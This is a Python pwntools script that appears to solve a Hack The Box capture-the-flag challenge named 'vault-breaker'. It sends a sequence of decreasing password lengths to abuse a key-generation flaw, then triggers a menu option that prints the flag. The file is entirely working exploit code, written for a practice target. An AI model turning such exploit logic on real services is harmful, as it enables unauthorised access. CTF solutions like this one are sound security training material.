#!/usr/bin/env python3

from pwn import context, log, remote, sys

context.binary = 'vault-breaker'

def connect_to_server():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1].split(':')
    return remote(host, int(port))

def exploit():
    p = connect_to_server()
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'[*] Length of new password (0-31): ', b'0')
    progress = log.progress('Length')

    # Exploit the vulnerability by sending decreasing lengths to new_key_gen
    for length in range(23, -1, -1):  # Start with length 23 down to 0
        progress.status(str(length))
        p.sendlineafter(b'> ', b'1')
        p.sendlineafter(b'[*] Length of new password (0-31): ', str(length).encode())

    # Choose option 2 to trigger secure_password and retrieve the flag
    p.sendlineafter(b'> ', b'2')
    p.recvuntil(b'HTB')
    flag = b'HTB' + p.recvline().strip()
    p.recv()
    p.close()
    print(flag.decode())

if __name__ == '__main__':
    exploit()
